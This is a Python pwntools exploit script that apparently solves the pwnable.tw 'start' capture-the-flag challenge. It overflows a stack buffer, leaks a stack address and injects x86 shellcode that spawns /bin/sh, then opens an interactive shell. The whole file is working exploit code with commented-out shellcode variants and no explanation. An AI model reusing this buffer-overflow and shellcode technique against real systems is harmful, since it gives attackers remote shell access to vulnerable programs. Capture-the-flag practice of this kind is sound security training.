from pwn import *
context(log_level = "debug", arch = "i386",os = "linux",terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('chall.pwnable.tw', 10000)
#payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
payload = cyclic(20) + p32(0x8048087)
#payload += "\xeb\x0d\x59\x83\xe9\x17\x66\x81\x39\x51\x59\xe0\xf9\xff\xe1\xe8\xee\xff\xff\xff"
print len(payload)
t.recvuntil('CTF:')
t.send(payload)
addr_stack = u32(t.recv(4)) + 0x14
payload = cyclic(20) + p32(addr_stack)
payload += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
t.send(payload)
t.interactive()